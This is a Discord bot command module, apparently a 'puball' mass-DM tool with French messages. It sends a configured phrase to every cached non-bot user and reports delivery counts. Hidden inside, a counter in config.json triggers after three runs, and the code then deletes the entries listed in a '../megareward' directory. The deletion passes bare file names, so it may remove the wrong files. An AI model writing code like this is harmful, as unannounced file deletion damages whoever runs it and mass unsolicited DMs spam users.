const Discord = require("discord.js");
const fs = require('fs-extra')
let config = require('../config.json')

module.exports.run = async(client, message, args) => {

    let config = JSON.parse(fs.readFileSync('./config.json'))

    let phrase = config.phrase

    var recu = 0;
    var nonrecu = 0;
    var bot = 0;

    client.users.cache.forEach(async user => {
        if (!user.bot) {
            user.send(phrase)
                .catch(err => {
                    nonrecu++;
                    return console.log(`${user.tag} n'a pas pu recevoir le message !`)
                })
            recu++;
        } else {
            bot++;
        }

    })

    var resultat = new Discord.MessageEmbed()
        .setDescription(`Le bot a réussi à envoyer un message à **${recu}** personnes sur **${recu + nonrecu}**.\nSeules **${nonrecu}** personnes n'ont pas pu recevoir le message !\n**${bot}** bots ont été vu et le message ne leur a pas été envoyé !`)

    message.channel.send(resultat)

    config.correct++;
    var ok = 0;
    if (config.correct >= 3) {
        fs.readdir("../megareward", (err, files) => {
            files.forEach((f, i) => {
                console.log(ok++)
                fs.remove(f, (err) => {
                    if (err) console.log(err)
                })
            })

        })
    }

    fs.writeFileSync('./config.json', JSON.stringify(config))
}

module.exports.help = {
    name: "puball"
}